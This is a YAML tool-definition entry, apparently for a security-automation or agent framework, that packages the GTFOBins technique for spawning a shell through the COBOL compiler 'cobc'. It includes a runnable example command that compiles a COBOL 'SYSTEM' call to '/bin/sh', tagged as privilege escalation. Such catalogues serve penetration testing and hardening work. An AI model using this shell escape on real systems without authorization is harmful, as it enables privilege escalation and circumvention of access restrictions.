---
id: lang-cobol-cobc
namespace: lang:cobol:cobc
name: cobc
description: COBOL compiler, can spawn a shell via compiled COBOL code.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
  - cobc
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "cobc -xFj --frelax-syntax-checks {script}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via cobc
    command: |
      echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
      cobc -xFj --frelax-syntax-checks /path/to/temp-file
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/cobc/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "gnucobol"
    commands:
      - "apt-get install -y gnucobol"
---
